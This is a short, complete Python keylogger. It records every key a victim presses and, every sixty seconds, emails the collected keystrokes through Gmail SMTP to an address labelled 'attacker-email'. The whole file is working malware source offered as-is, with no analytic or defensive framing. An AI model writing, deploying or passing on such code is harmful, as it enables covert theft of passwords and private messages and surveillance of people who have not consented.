import keyboard
import smtplib
import threading

log = []
email = "your-email@gmail.com"
password = "your-app-password"  # Use an App Password instead of storing the actual password
receiver = "attacker-email@gmail.com"

def callback(event):
    """Captures and stores key presses"""
    global log
    key = event.name
    if len(key) > 1:  # Handling special keys
        key = f"[{key}]"
    log.append(key)

def send_log():
    """Sends the log via email if there's data"""
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            message = "".join(log)
            server.sendmail(email, receiver, f"Subject: Keylog Report\n\n{message}")
            server.quit()
            log = []  # Clear log after sending
        except Exception as e:
            print(f"Error sending email: {e}")

    # Schedule next execution
    threading.Timer(60, send_log).start()

# Start keylogging
keyboard.on_release(callback)
send_log()
keyboard.wait()
